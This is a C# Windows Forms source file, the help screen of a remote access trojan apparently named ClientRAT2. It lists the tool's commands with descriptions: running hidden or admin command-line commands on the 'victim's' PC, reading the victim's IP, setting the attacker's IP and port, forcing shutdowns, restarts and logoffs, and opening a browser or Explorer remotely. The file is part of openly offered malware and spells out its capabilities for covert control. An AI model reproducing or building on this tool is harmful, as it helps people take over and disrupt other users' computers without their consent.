using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ClientRAT2
{
    public partial class Help : Form
    {
        public Help()
        {
            InitializeComponent();
            Dictionary<string, string> HelpCommands = new Dictionary<string, string>();
            HelpCommands.Add("msg/[text]", "Display text on victims pc");
            HelpCommands.Add("endconnection/", "End victims server");
            HelpCommands.Add("alert msg/[text]", "Display warning message on screen");
            HelpCommands.Add("cmd/[command]", "Execute cmd command: No Admin, Not Hidden");
            HelpCommands.Add("cmdh/[command]", "Execute cmd command: No Admin, Hidden");
            HelpCommands.Add("cmda/[command]", "Execute cmd command as admin: Admin, Not Hidden");
            HelpCommands.Add("getip/", "Display local ip of victim pc");
            HelpCommands.Add("connectip/[ip]", "Set new attacker ip");
            HelpCommands.Add("connectname/[ip]", "Set new attacker by PC name");
            HelpCommands.Add("setport/[port number]", "Set new port of communication");            
            HelpCommands.Add("shutdown/[seconds]", "Shutdowns victims PC in X seconds(Can be zero)");
            HelpCommands.Add("cancelshutdown/", "Cancels shutdown of victims PC");
            HelpCommands.Add("logoffuser/", "Logs off current victims user");
            HelpCommands.Add("restart/[seconds]", "Restart victims PC in X seconds(Can be zero)");
            HelpCommands.Add("openWE/", "Opens Windows Explorer");
            HelpCommands.Add("openweb/[www.example.com]", "Opens default browser at [www.example.com] ");
            HelpCommands.Add("cmdfile/[command]", "Creates .txt with the cmd output at desktop(File name is 'dross.txt'. Example: cmdfile/ipconfig");

            int i = 1;
            foreach (KeyValuePair<string,string> kvp in HelpCommands)
            {
                this.dataGridView1.Rows.Add(i, kvp.Key,kvp.Value);
                i++;
            }
            
        }

        private void dataGridView1_CellContentClick(object sender, DataGridViewCellEventArgs e)
        {

        }

        private void Help_Load(object sender, EventArgs e)
        {

        }
    }
}
